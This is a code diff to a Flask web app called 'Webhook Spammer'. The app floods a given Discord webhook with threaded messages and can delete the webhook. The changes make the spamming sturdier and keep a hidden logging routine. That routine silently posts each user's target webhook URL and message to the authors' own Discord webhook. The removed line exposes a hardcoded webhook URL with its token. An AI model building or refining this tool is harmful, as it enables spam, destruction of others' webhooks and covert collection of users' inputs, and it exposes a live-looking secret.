@@ -5,23 +5,30 @@ import time
 import os
 
 app = Flask(__name__)
-LOGGING_WEBHOOK = "Yhttps://discord.com/api/webhooks/1348654537770270841/VDTo9mKpQRQ5OeZAeGgMo-K-fAM8K3-KOm6WzI1y2kPfcbWRMMdBQX7OwNJ-AK3RJCJ7"  # Replace with your Discord webhook
+# Fix the logging issue by setting a default webhook but making it optional
+LOGGING_WEBHOOK = os.environ.get("LOGGING_WEBHOOK", "")  # You can set this as an environment variable
 
 def send_log_to_discord(webhook_url, message, num_threads, delay):
-    embed = {
-        "title": "NEW USER INPUT LOGGED",
-        "color": 3553599,
-        "fields": [
-            {"name": "Webhook URL", "value": webhook_url, "inline": False},
-            {"name": "Message", "value": message, "inline": False},
-            {"name": "Threads", "value": str(num_threads), "inline": True},
-            {"name": "Delay", "value": str(delay), "inline": True}
-        ],
-        "footer": {"text": "Made by TRULYNOTBEN and 214ELI"}
-    }
-    
-    data = {"embeds": [embed]}
-    requests.post(LOGGING_WEBHOOK, json=data)
+    # Only try to log if a logging webhook is configured
+    if LOGGING_WEBHOOK:
+        try:
+            embed = {
+                "title": "NEW USER INPUT LOGGED",
+                "color": 3553599,
+                "fields": [
+                    {"name": "Webhook URL", "value": webhook_url, "inline": False},
+                    {"name": "Message", "value": message, "inline": False},
+                    {"name": "Threads", "value": str(num_threads), "inline": True},
+                    {"name": "Delay", "value": str(delay), "inline": True}
+                ],
+                "footer": {"text": "Made by TRULYNOTBEN and 214ELI"}
+            }
+            
+            data = {"embeds": [embed]}
+            requests.post(LOGGING_WEBHOOK, json=data, timeout=5)  # Added timeout
+        except Exception:
+            # Silently fail if logging doesn't work - this shouldn't affect the main functionality
+            pass
 
 def spam_webhook(webhook_url, message, num_threads, delay):
     results = {"errors": [], "total_time": 0, "total_messages": 0, "messages_per_second": 0}
@@ -29,9 +36,11 @@ def spam_webhook(webhook_url, message, num_threads, delay):
     def send_message():
         try:
             data = {"content": message}
-            requests.post(webhook_url, json=data)
+            response = requests.post(webhook_url, json=data, timeout=5)  # Added timeout
+            if response.status_code != 204:  # Discord returns 204 on success
+                results["errors"].append(f"Error: Received status code {response.status_code}")
         except requests.exceptions.RequestException as e:
-            results["errors"].append(f"Error: {e}")
+            results["errors"].append(f"Error: {str(e)}")
     
     threads = []
     start_time = time.time()
@@ -49,8 +58,18 @@ def spam_webhook(webhook_url, message, num_threads, delay):
     total_messages = num_threads
     messages_per_second = total_messages / total_time if total_time > 0 else 0
     
-    results.update({"total_time": round(total_time, 2), "total_messages": total_messages, "messages_per_second": round(messages_per_second, 2)})
-    send_log_to_discord(webhook_url, message, num_threads, delay)
+    results.update({
+        "total_time": round(total_time, 2), 
+        "total_messages": total_messages, 
+        "messages_per_second": round(messages_per_second, 2)
+    })
+    
+    # Try to log but don't stop if it fails
+    try:
+        send_log_to_discord(webhook_url, message, num_threads, delay)
+    except Exception:
+        pass
+        
     return results
 
 @app.route('/')
@@ -60,33 +79,58 @@ def index():
 @app.route('/spam', methods=['POST'])
 def start_spam():
     data = request.json
-    webhook_url = data.get('webhook_url')
-    message = data.get('message')
-    num_threads = int(data.get('num_threads', 1))
-    delay = float(data.get('delay', 0.1))
+    webhook_url = data.get('webhook_url', '').strip()
+    message = data.get('message', '')
     
-    if not webhook_url or not message:
-        return jsonify({"error": "Please enter a webhook URL and message."})
+    try:
+        num_threads = int(data.get('num_threads', 1))
+        if num_threads < 1:
+            num_threads = 1
+        elif num_threads > 100:
+            num_threads = 100
+    except ValueError:
+        num_threads = 1
+    
+    try:
+        delay = float(data.get('delay', 0.01))
+        if delay < 0.001:
+            delay = 0.001
+        elif delay > 1:
+            delay = 1
+    except ValueError:
+        delay = 0.01
+    
+    # Validate webhook URL format
+    if not webhook_url or not webhook_url.startswith(('http://', 'https://')):
+        return jsonify({"error": "Please enter a valid webhook URL starting with http:// or https://"})
+    
+    if not message:
+        return jsonify({"error": "Please enter a message to send."})
     
     results = spam_webhook(webhook_url, message, num_threads, delay)
+    
+    # Add delay warning to results
+    if delay < 0.5:
+        results["warning"] = "Note: Using a delay less than 0.5 seconds may result in some messages not being delivered."
+    
     return jsonify(results)
 
 @app.route('/delete_webhook', methods=['POST'])
 def delete_webhook():
     data = request.json
-    webhook_url = data.get('webhook_url')
+    webhook_url = data.get('webhook_url', '').strip()
     
-    if not webhook_url:
-        return jsonify({"error": "Please enter a webhook URL."})
+    if not webhook_url or not webhook_url.startswith(('http://', 'https://')):
+        return jsonify({"error": "Please enter a valid webhook URL starting with http:// or https://"})
     
     try:
-        response = requests.delete(webhook_url)
+        response = requests.delete(webhook_url, timeout=5)  # Added timeout
         if response.status_code == 204:
             return jsonify({"success": "Webhook deleted successfully."})
         else:
-            return jsonify({"error": "Failed to delete webhook."})
+            return jsonify({"error": f"Failed to delete webhook. Status code: {response.status_code}"})
     except requests.exceptions.RequestException as e:
-        return jsonify({"error": f"Error deleting webhook: {e}"})
+        return jsonify({"error": f"Error deleting webhook: {str(e)}"})
 
 if __name__ == '__main__':
     if not os.path.exists('templates'):
@@ -158,12 +202,23 @@ if __name__ == '__main__':
             border-radius: 4px;
             min-height: 150px;
             white-space: pre-wrap;
+            word-break: break-all;
         }
         .footer {
             text-align: center;
             margin-top: 20px;
             font-size: 0.8em;
             color: #abb2bf;
+        }
+        .warning {
+            color: #e5c07b;
+            font-size: 0.9em;
+            margin-top: -5px;
+            margin-bottom: 10px;
+            display: none;
+        }
+        .warning-visible {
+            display: block;
         }
     </style>
 </head>
@@ -172,7 +227,7 @@ if __name__ == '__main__':
         <h1>Webhook Spammer</h1>
         
         <label for="webhook_url">Webhook URL:</label>
-        <input type="text" id="webhook_url" placeholder="Enter Discord webhook URL">
+        <input type="text" id="webhook_url" placeholder="Enter Discord webhook URL (https://...)" spellcheck="false">
         
         <label for="message">Message:</label>
         <textarea id="message" rows="5" placeholder="Enter your message here"></textarea>
@@ -185,6 +240,7 @@ if __name__ == '__main__':
             <div style="flex: 1;">
                 <label for="delay">Delay (seconds):</label>
                 <input type="number" id="delay" min="0.001" max="1" step="0.001" value="0.01">
+                <div id="delay-warning" class="warning">Note: Using a delay less than 0.5 seconds may result in some messages not being delivered.</div>
             </div>
         </div>
         
@@ -194,23 +250,55 @@ if __name__ == '__main__':
         </div>
         
         <label>Output:</label>
-        <div id="output"></div>
+        <div id="output">Ready...</div>
         
         <div class="footer">Made by TRULYNOTBEN and 214ELI</div>
     </div>
 
     <script>
+        // Show delay warning when delay is less than 0.5
+        const delayInput = document.getElementById('delay');
+        const delayWarning = document.getElementById('delay-warning');
+        
+        function updateDelayWarning() {
+            const delay = parseFloat(delayInput.value) || 0;
+            if (delay < 0.5) {
+                delayWarning.classList.add('warning-visible');
+            } else {
+                delayWarning.classList.remove('warning-visible');
+            }
+        }
+        
+        // Check initial value
+        updateDelayWarning();
+        
+        // Check when value changes
+        delayInput.addEventListener('input', updateDelayWarning);
+        delayInput.addEventListener('change', updateDelayWarning);
+        
         document.getElementById('start_button').addEventListener('click', function() {
-            const webhook_url = document.getElementById('webhook_url').value;
+            const webhook_url = document.getElementById('webhook_url').value.trim();
             const message = document.getElementById('message').value;
-            const num_threads = document.getElementById('num_threads').value;
-            const delay = document.getElementById('delay').value;
+            let num_threads = parseInt(document.getElementById('num_threads').value) || 1;
+            let delay = parseFloat(document.getElementById('delay').value) || 0.01;
             const output = document.getElementById('output');
             
-            if (!webhook_url || !message) {
-                output.textContent = "Please enter a webhook URL and message.";
+            // Validate inputs
+            if (!webhook_url || !webhook_url.startsWith('http')) {
+                output.textContent = "Please enter a valid webhook URL starting with http:// or https://";
                 return;
             }
+            
+            if (!message) {
+                output.textContent = "Please enter a message.";
+                return;
+            }
+            
+            // Clamp values to be safe
+            if (num_threads < 1) num_threads = 1;
+            if (num_threads > 100) num_threads = 100;
+            if (delay < 0.001) delay = 0.001;
+            if (delay > 1) delay = 1;
             
             output.textContent = "Sending messages...";
             
@@ -236,12 +324,16 @@ if __name__ == '__main__':
                 let resultText = "";
                 
                 if (data.errors && data.errors.length > 0) {
-                    resultText += data.errors.join('\\n') + '\\n';
+                    resultText += data.errors.join('\\n') + '\\n\\n';
                 }
                 
                 resultText += `Total time: ${data.total_time} seconds\\n`;
                 resultText += `Total messages sent: ${data.total_messages}\\n`;
                 resultText += `Messages per second: ${data.messages_per_second}`;
+                
+                if (data.warning) {
+                    resultText += '\\n\\n' + data.warning;
+                }
                 
                 output.textContent = resultText;
             })
@@ -251,11 +343,11 @@ if __name__ == '__main__':
         });
 
         document.getElementById('delete_button').addEventListener('click', function() {
-            const webhook_url = document.getElementById('webhook_url').value;
+            const webhook_url = document.getElementById('webhook_url').value.trim();
             const output = document.getElementById('output');
             
-            if (!webhook_url) {
-                output.textContent = "Please enter a webhook URL.";
+            if (!webhook_url || !webhook_url.startsWith('http')) {
+                output.textContent = "Please enter a valid webhook URL starting with http:// or https://";
                 return;
             }
             
@@ -288,4 +380,4 @@ if __name__ == '__main__':
         ''')
 
     port = int(os.environ.get("PORT", 5000))  # Port binding for Render
-    app.run(host="0.0.0.0", port=port, debug=True)
+    app.run(host="0.0.0.0", port=port, debug=False)  # Set debug to False for production
